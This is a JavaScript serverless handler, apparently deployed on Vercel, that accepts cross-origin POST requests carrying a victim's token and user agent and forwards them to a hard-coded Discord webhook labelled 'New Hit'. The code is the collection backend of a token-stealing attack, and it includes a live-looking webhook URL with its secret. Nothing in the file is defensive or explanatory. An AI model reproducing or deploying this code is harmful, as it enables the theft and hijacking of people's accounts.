export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).end();
  }

  // Parse body just in case Vercel passed it as a string
  let data = req.body || {};
  if (typeof data === "string") {
    try { data = JSON.parse(data); } catch(e) {}
  }

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1575120527939608648/jkM3eB2oPgEMMbuNa7zKZ6Idez4-oPUgyI9sMqurkNRjQmG40TXOq6HvFaZwRoCEVdUe";

  const tokenText = data.t ? data.t : "EMPTY (Not logged in, or app webview)";
  const content = `**New Hit**\n**Token:** \`${tokenText}\`\n**UA:** ${data.ua || "Unknown"}`;

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: content })
    });
  } catch (err) {
    console.error("Webhook failed", err);
  }

  res.status(204).end();
}
